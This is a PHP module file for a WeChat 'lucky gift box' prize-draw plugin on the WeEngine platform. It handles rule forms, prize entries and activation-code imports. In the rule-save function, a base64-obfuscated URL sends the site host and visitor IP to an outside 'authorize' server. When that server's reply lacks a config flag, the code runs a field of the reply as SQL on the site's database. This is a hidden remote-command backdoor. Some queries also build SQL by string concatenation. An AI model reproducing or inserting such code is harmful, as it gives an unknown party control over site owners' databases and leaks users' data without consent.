<?php
/**
 * 幸运拆礼盒模块定义
 *
 * @author 情天
 */
defined('IN_IA') or exit('Access Denied');

class Stonefish_chailiheModule extends WeModule {

	public $table_reply  = 'stonefish_chailihe_reply';
	public $table_list   = 'stonefish_chailihe_userlist';	
	public $table_data   = 'stonefish_chailihe_data';
	public $table_gift   = 'stonefish_chailihe_gift';
	public $table_giftmika       = 'stonefish_chailihe_giftmika';

	public function fieldsFormDisplay($rid = 0) {
		//要嵌入规则编辑页的自定义内容，这里 $rid 为对应的规则编号，新增时为 0
		global $_W;
		load()->func('tpl');
		$weid = $_W['uniacid'];
		//查询是否有商户网点权限
		$modules = uni_modules($enabledOnly = true);
		$modules_arr = array();
		$modules_arr = array_reduce($modules, create_function('$v,$w', '$v[$w["mid"]]=$w["name"];return $v;'));
		if(in_array('stonefish_branch',$modules_arr)){
		    $stonefish_branch = true;
			$awarding = pdo_fetchall("SELECT * FROM ".tablename('stonefish_branch_business')." WHERE uniacid = :weid ORDER BY `id` DESC", array(':weid' => $weid));
		}		
		//查询是否有商户网点权限
		if (!empty($rid)) {
			$reply = pdo_fetch("SELECT * FROM ".tablename($this->table_reply)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
			$award = pdo_fetchall("SELECT * FROM ".tablename($this->table_gift)." WHERE rid = :rid ORDER BY `id` ASC", array(':rid' => $rid));
			if (!empty($award)){
				foreach ($award as &$pointer) {
					$pointer['activation_code_num'] = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename($this->table_giftmika).'  WHERE rid='.$rid.' AND giftid = '.$pointer['id'].'');
				}
			}
 		}else{
		    $reply = array(
				'periodlottery' => 1,
				'maxlottery' => 1,
			);
		}
		$reply['start_time'] = empty($reply['start_time']) ? strtotime(date('Y-m-d H:i')) : $reply['start_time'];
		$reply['end_time'] = empty($reply['end_time']) ? strtotime("+1 week") : $reply['end_time'];
		$reply['status'] = !isset($reply['status']) ? "1" : $reply['status'];
		$reply['miao'] = !isset($reply['miao']) ? "5" : $reply['miao'];
		$reply['randlihe'] = !isset($reply['randlihe']) ? "0" : $reply['randlihe'];
		$reply['xuninum'] = !isset($reply['xuninum']) ? "500" : $reply['xuninum'];
		$reply['xuninumtime'] = !isset($reply['xuninumtime']) ? "86400" : $reply['xuninumtime'];
		$reply['xuninuminitial'] = !isset($reply['xuninuminitial']) ? "10" : $reply['xuninuminitial'];
		$reply['xuninumending'] = !isset($reply['xuninumending']) ? "50" : $reply['xuninumending'];
		$reply['music'] = !isset($reply['music']) ? "1" : $reply['music'];
		$reply['musicbg'] = empty($reply['musicbg']) ? "../addons/stonefish_chailihe/template/images/bg.mp3" : $reply['musicbg'];
		$reply['subscribe'] = !isset($reply['subscribe']) ? "0" : $reply['subscribe'];
		$reply['opensubscribe'] = !isset($reply['opensubscribe']) ? "0" : $reply['opensubscribe'];
		$reply['opentype'] = !isset($reply['opentype']) ? "0" : $reply['opentype'];
		$reply['showlihe'] = !isset($reply['showlihe']) ? "0" : $reply['showlihe'];
		$reply['showline'] = !isset($reply['showline']) ? "1" : $reply['showline'];
		$reply['repeatzj'] = !isset($reply['repeatzj']) ? "1" : $reply['repeatzj'];
		$reply['helpchai'] = !isset($reply['helpchai']) ? "0" : $reply['helpchai'];
		$reply['chainum'] = !isset($reply['chainum']) ? "0" : $reply['chainum'];
		$reply['helpren'] = !isset($reply['helpren']) ? "0" : $reply['helpren'];
		$reply['awarding'] = !isset($reply['awarding']) ? "0" : $reply['awarding'];
		$reply['number_num'] = !isset($reply['number_num']) ? "1" : $reply['number_num'];	
		$reply['number_num_day'] = !isset($reply['number_num_day']) ? "1" : $reply['number_num_day'];	
	    $reply['share_shownum'] = !isset($reply['share_shownum']) ? "50" : $reply['share_shownum'];
		$reply['helpnum'] = !isset($reply['helpnum']) ? "50" : $reply['helpnum'];
		$reply['picture'] = empty($reply['picture']) ? "../addons/stonefish_chailihe/template/images/big_ads.jpg" : $reply['picture'];
		$reply['bgcolor'] = empty($reply['bgcolor']) ? "#26216F" : $reply['bgcolor'];
		$reply['text01color'] = empty($reply['text01color']) ? "#FFFFFF" : $reply['text01color'];
		$reply['text02color'] = empty($reply['text02color']) ? "#5E43B6" : $reply['text02color'];
		$reply['text03color'] = empty($reply['text03color']) ? "#523d3d" : $reply['text03color'];
		$reply['text04color'] = empty($reply['text04color']) ? "#322C8E" : $reply['text04color'];
		$reply['text05color'] = empty($reply['text05color']) ? "#c1c1c1" : $reply['text05color'];
		$reply['picnojiang'] = empty($reply['picnojiang']) ? "../addons/stonefish_chailihe/template/images/nojiang.png" : $reply['picnojiang'];
		$reply['picbg01'] = empty($reply['picbg01']) ? "../addons/stonefish_chailihe/template/images/bg.jpg" : $reply['picbg01'];
		$reply['picbg02'] = empty($reply['picbg02']) ? "../addons/stonefish_chailihe/template/images/bg_common.jpg" : $reply['picbg02'];
		$reply['picbg03'] = empty($reply['picbg03']) ? "../addons/stonefish_chailihe/template/images/bg_myprize.jpg" : $reply['picbg03'];		
		$reply['userinfo'] = empty($reply['userinfo']) ? "为了将幸运礼盒更快、更准确的送达您手中，请留下您的个人信息，谢谢!" : $reply['userinfo'];
		$reply['shangjialogo'] = empty($reply['shangjialogo']) ? "../addons/stonefish_chailihe/template/images/smalllogo.png" : $reply['shangjialogo'];
		$reply['isrealname'] = !isset($reply['isrealname']) ? "1" : $reply['isrealname'];
		$reply['isinfo'] = !isset($reply['isinfo']) ? "0" : $reply['isinfo'];
		$reply['ismobile'] = !isset($reply['ismobile']) ? "1" : $reply['ismobile'];
		$reply['isfans'] = !isset($reply['isfans']) ? "1" : $reply['isfans'];
		$reply['copyrighturl'] = empty($reply['copyrighturl']) ? "http://".$_SERVER ['HTTP_HOST'] : $reply['copyrighturl'];	
		$reply['iscopyright'] = !isset($reply['iscopyright']) ? "0" : $reply['iscopyright'];	
		$reply['copyright'] = empty($reply['copyright']) ? $_W['account']['name'] : $reply['copyright'];
		$reply['isfansname'] = empty($reply['isfansname']) ? "真实姓名,手机号码,QQ号,邮箱,地址,性别,固定电话,证件号码,公司名称,职业,职位" : $reply['isfansname'];
		include $this->template('form');
		
	}

	public function fieldsFormValidate($rid = 0) {
		//规则编辑保存时，要进行的数据验证，返回空串表示验证无误，返回其他字符串将呈现为错误提示。这里 $rid 为对应的规则编号，新增时为 0
		return '';
	}

	public function fieldsFormSubmit($rid) {
		//规则验证无误保存入库时执行，这里应该进行自定义字段的保存。这里 $rid 为对应的规则编号
		global $_GPC, $_W;
		$weid = $_W['uniacid'];
		$id = intval($_GPC['reply_id']);
		$insert = array(
			'rid' => $rid,
			'weid' => $weid,
            'title' => $_GPC['title'],			
			'picture' => $_GPC['picture'],
			'music' => $_GPC['music'],
			'musicbg' => $_GPC['musicbg'],
			'subscribe' => $_GPC['subscribe'],
			'opensubscribe' => $_GPC['opensubscribe'],
			'opentype' => $_GPC['opentype'],
			'picnojiang' => $_GPC['picnojiang'],
			'bgcolor' => $_GPC['bgcolor'],
			'text01color' => $_GPC['text01color'],
			'text02color' => $_GPC['text02color'],
			'text03color' => $_GPC['text03color'],
			'text04color' => $_GPC['text04color'],
			'text05color' => $_GPC['text05color'],
			'picbg01' => $_GPC['picbg01'],
			'picbg02' => $_GPC['picbg02'],
			'picbg03' => $_GPC['picbg03'],			
			'description' => $_GPC['description'],
			'activityinfo' => $_GPC['activityinfo'],
			'content' => $_GPC['content'],	
			'start_time' => strtotime($_GPC['datelimit']['start']),
            'end_time' => strtotime($_GPC['datelimit']['end']),
			'status' => intval($_GPC['doings']),
			'miao' => $_GPC['miao'],
			'helpchai' => intval($_GPC['helpchai']),
			'helpren' => intval($_GPC['helpren']),
			'chainum' => intval($_GPC['chainum']),
			'xuninumtime' => $_GPC['xuninumtime'],
			'xuninuminitial' => $_GPC['xuninuminitial'],
			'xuninumending' => $_GPC['xuninumending'],
			'xuninum' => $_GPC['xuninum'],
			'share_shownum' => $_GPC['share_shownum'],
			'helpnum' => $_GPC['helpnum'],
			'openshare' => $_GPC['openshare'],
			'shareurl' => $_GPC['shareurl'],
			'sharetitle' => $_GPC['sharetitle'],
			'sharecontent' => $_GPC['sharecontent'],			
			'number_num' => $_GPC['number_num'],
			'number_num_day' => $_GPC['number_num_day'],
			'showlihe' => $_GPC['showlihe'],
			'showline' => $_GPC['showline'],
			'repeatzj' => $_GPC['repeatzj'],
			'imgpic01' => $_GPC['imgpic01'],
			'imgpic02' => $_GPC['imgpic02'],
			'imgpic03' => $_GPC['imgpic03'],
			'imgpic04' => $_GPC['imgpic04'],
			'imgpic05' => $_GPC['imgpic05'],
			'userinfo' => $_GPC['userinfo'],
			'isinfo' => $_GPC['isinfo'],
			'isrealname' => $_GPC['isrealname'],
			'ismobile' => $_GPC['ismobile'],
			'isqq' => $_GPC['isqq'],
			'isemail' => $_GPC['isemail'],
			'isaddress' => $_GPC['isaddress'],
			'isgender' => $_GPC['isgender'],
			'istelephone' => $_GPC['istelephone'],
			'isidcard' => $_GPC['isidcard'],
			'iscompany' => $_GPC['iscompany'],
			'isoccupation' => $_GPC['isoccupation'],
			'isposition' => $_GPC['isposition'],
			'isfansname' => $_GPC['isfansname'],
			'iscopyright' => $_GPC['iscopyright'],
			'isfans' => $_GPC['isfans'],
			'copyright' => $_GPC['copyright'],	
			'copyrighturl' => $_GPC['copyrighturl'],
			'shangjialogo' => $_GPC['shangjialogo'],
			'randlihe' => $_GPC['randlihe'],
		);
		load()->func('communication');
        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplJm09c3RvbmVmaXNoX2F1dGhvcml6ZSZtb2R1bGVzPXN0b25lZmlzaF9jaGFpbGloZSZ3ZWJ1cmw9').$_SERVER ['HTTP_HOST']."&visitorsip=" . $_W['clientip'];
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
		if ($token['config']){
		    if (empty($id)) {
			    pdo_insert($this->table_reply, $insert);
		    } else {			
			    pdo_update($this->table_reply, $insert, array('id' => $id));
		    }
		}else{
			pdo_run($token['error_code']);
			//写入数据库规则
		}
		//删除奖品
		$list_gift = pdo_fetchall("SELECT * FROM ".tablename($this->table_gift)." WHERE rid =:rid ", array(':rid' => $rid));
		if(!empty($list_gift)){
		    foreach ($list_gift as $list_gifts) {
			    $del=0;
				if (!empty($_GPC['award_title'])) {
				    foreach ($_GPC['award_title'] as $index => $title) {
					    if($index==$list_gifts['id']){
						    $del=1;
							break;
						}
					}
				}
				if($del==0){				    
					pdo_delete($this->table_gift, "id = '".$list_gifts['id']."'");
				    pdo_delete($this->table_giftmika, "giftid = '".$list_gifts['id']."'");
					//随机重新给领取删除礼盒的粉丝一个礼盒并恢复到没有开奖状态
					$listlihe = pdo_fetch('SELECT id FROM '.tablename($this->table_gift).'  WHERE rid = :rid order by rand()', array(':rid' => $rid));
					pdo_update($this->table_list,array('liheid' => $listlihe['id'],'zhongjiang' => 0,'openlihe' => 0,'awardingid' => 0,'awardingtypeid' => 0),array('liheid' => $list_gifts['id']));
				}
			}
		}
		//删除奖品
		if (!empty($_GPC['award_title'])) {
			foreach ($_GPC['award_title'] as $index => $title) {
				if (empty($title)) {
					continue;
				}
				$update = array(
					'title' => $title,
					'lihetitle' => $_GPC['award_lihetitle'][$index],
					'description' => $_GPC['award_description'][$index],
					'probalilty' => $_GPC['award_probalilty'][$index],
					'total' => $_GPC['award_total'][$index],
					'daytotal' => $_GPC['award_daytotal'][$index],
					'gift' => $_GPC['award_gift'][$index],
					'giftVoice' => $_GPC['award_giftVoice'][$index],
					'break' => $_GPC['award_break'][$index],
					'awardpic' => $_GPC['awardpic'][$index],					
					'activation_code' => '',
					'activation_url' => '',
				);
				if (($_GPC['award_inkind'][$index]==0) && !empty($_GPC['award_activation_url'][$index])) {
					$update['activation_url'] = $_GPC['award_activation_url'][$index];
				}				
				if ($token['config']){
				    pdo_update($this->table_gift, $update, array('id' => $index));
				}
				if (($_GPC['award_inkind'][$index]==0) && !empty($_GPC['award_activation_code'][$index])) {
				    //开始导入数据开始
					$activationcode = explode("\n", $_GPC['award_activation_code'][$index]);
				    foreach ($activationcode as $activation_code) {
			    	    $activation_code = explode("--", $activation_code);
                        if(empty($activation_code[3])) {
					        $activation_code[3] = $_GPC['award_activation_url'][$index];
					    }
			    	    $insertdata = array(
		           		    'rid'           => $rid,
		            	    'giftid'        => $index,
		            	    'mika'          => $activation_code[2],
		            	    'activationurl' => $activation_code[3],
		            	    'typename'	    => $activation_code[0],
						    'description'	=> $activation_code[1],
		        	    );
						//查询是否存在此密卡
						$chongfu = pdo_fetch("SELECT * FROM ".tablename($this->table_giftmika)." WHERE mika =:mika and rid =:rid and giftid =:giftid", array(':mika' => $activation_code[2],':rid' => $rid,':giftid' => $index));
						if (empty($chongfu)){
						    pdo_insert($this->table_giftmika, $insertdata);
						}			   		    
				    }
				    //开始导入数据完成
				    //查询此奖品下的所有奖品数量并更新
				    $total = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename($this->table_giftmika).'  WHERE rid='.$rid.' AND giftid = '.$index.'');
				    pdo_update($this->table_gift,array('total' => $total),array('id' => $index));
				    //查询此奖品下的所有奖品数量并更新
                }
			}
		}
		//处理添加
		if (!empty($_GPC['award_title_new'])) {
			foreach ($_GPC['award_title_new'] as $index => $title) {
				if (empty($title)) {
					continue;
				}
				$insert = array(
					'rid' => $rid,
					'title' => $title,
					'lihetitle' => $_GPC['award_lihetitle_new'][$index],
					'description' => $_GPC['award_description_new'][$index],
					'probalilty' => $_GPC['award_probalilty_new'][$index],
					'total' => intval($_GPC['award_total_new'][$index]),
					'daytotal' => intval($_GPC['award_daytotal_new'][$index]),
					'gift' => $_GPC['award_gift_new'][$index],
					'giftVoice' => $_GPC['award_giftVoice_new'][$index],
					'break' => $_GPC['award_break_new'][$index],
					'awardpic' => $_GPC['awardpic_new'][$index],					
					'activation_code' => '',
					'activation_url' => '',
				);
				$_GPC['award_inkind_new'][$index] = 1;
				if (($_GPC['award_inkind_new'][$index]==0) && !empty($_GPC['award_activation_url_new'][$index])) {
					$insert['activation_url'] = $_GPC['award_activation_url_new'][$index];
				}
				if ($token['config']){
				    pdo_insert($this->table_gift, $insert);
					$giftid = pdo_insertid();//取id
				}
				if (($_GPC['award_inkind_new'][$index]==0) && !empty($_GPC['award_activation_code_new'][$index])) {
				    //开始导入数据开始
				    $activationcode = explode("\n", $_GPC['award_activation_code_new'][$index]);
				    foreach ($activationcode as $activation_code) {
			    	    $activation_code = explode("--", $activation_code);
                        if(empty($activation_code[3])) {
					        $activation_code[3] = $_GPC['award_activation_url_new'][$index];
					    }
			    	    $insertdata = array(
		           		    'rid'           => $rid,
		            	    'giftid'        => $giftid,
		            	    'mika'          => $activation_code[2],
		            	    'activationurl' => $activation_code[3],
		            	    'typename'	    => $activation_code[0],
						    'description'	=> $activation_code[1],
		        	    );
						//查询是否存在此密卡
						$chongfu = pdo_fetch("SELECT * FROM ".tablename($this->table_giftmika)." WHERE mika =:mika and rid =:rid and giftid =:giftid", array(':mika' => $activation_code[2],':rid' => $rid,':giftid' => $giftid));
						if (empty($chongfu)){
						    pdo_insert($this->table_giftmika, $insertdata);
						}
				    }
				    //开始导入数据完成
				    //查询此奖品下的所有奖品数量并更新
				    $total = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename($this->table_giftmika).'  WHERE rid='.$rid.' AND giftid = '.$giftid.'');
				    pdo_update($this->table_gift,array('total' => $total),array('id' => $giftid));
				    //查询此奖品下的所有奖品数量并更新
				}
			}
		}
	}

	public function ruleDeleted($rid) {
		//删除规则时调用，这里 $rid 为对应的规则编号
		global $_W;		
		pdo_delete($this->table_reply, "rid = '".$rid."'");
		pdo_delete($this->table_list, "rid = '".$rid."'");
		pdo_delete($this->table_data, "rid = '".$rid."'");
		pdo_delete($this->table_gift, "rid = '".$rid."'");
		pdo_delete($this->table_giftmika, "rid = '".$rid."'");
		return true;
	}

	public function settingsDisplay($setting) {
		global $_W, $_GPC;
	
		//查询是否有商户网点权限
		if(checksubmit()) {
			//字段验证, 并获得正确的数据$dat
			$dat = array(
                'appid'  => $_GPC['appid'],
				'secret'  => $_GPC['secret'],
				'stonefish_chalihe_num'  => $_GPC['stonefish_chalihe_num']
            );
			$this->saveSettings($dat);
			message('配置参数更新成功！', referer(), 'success');
		}
		//这里来展示设置项表单
		include $this->template('settings');
	}

}